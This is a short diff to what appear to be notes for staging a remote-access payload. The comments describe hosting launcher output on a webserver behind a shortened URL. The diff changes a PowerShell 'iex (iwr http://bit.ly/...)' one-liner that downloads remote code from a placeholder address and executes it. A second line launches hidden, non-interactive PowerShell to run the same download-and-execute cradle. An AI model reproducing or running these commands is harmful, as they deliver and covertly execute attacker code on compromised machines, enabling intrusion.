@@ -5,7 +5,7 @@
 # save the launcher output to a file and host that on a webserver. Maybe even Github
 # get a shortened URL to the host, or memorize the IP.
 # Execute stage0 on a host, could be shellcode, or just execution
-iex (iwr http://bit.ly/xxxxxx/index.html).content
+iex (iwr http://bit.ly/xxxxxx/index.html).rawcontent
 
 # or if you need to kick off powershell as well
 powershell.exe -NoP -sta -NonI -W Hidden "iex (iwr http://bit.ly/xxxxxx/index.html).content"
